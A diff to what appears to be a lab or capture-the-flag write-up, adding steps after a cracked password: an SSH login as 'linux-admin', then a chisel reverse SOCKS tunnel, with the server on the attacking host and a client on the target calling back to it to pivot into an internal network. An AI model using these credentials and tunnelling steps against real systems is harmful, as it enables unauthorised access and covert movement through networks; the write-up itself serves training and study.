@@ -290,3 +290,18 @@ linux-admin:$6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2
 user- linux-admin
 pass- linuxrulez
 ```
+- SSH to the machine
+```bash
+└─$ ssh -l linux-admin 10.200.112.33
+```
+- Next step is to access the internal network for this use `chisel`.
+- Set up `chisel` on the attacking host and run cmd:
+```bash
+└─$ ./chisel server -p 8000 --reverse
+```
+- Transfer `chisel` on the target host and run cmd:
+```bash
+~$ ./chisel client 10.50.109.29:8000 R:socks
+```
+- By this, we successfully hosted internal traffic of the internal network to our attacking machine.
+- 
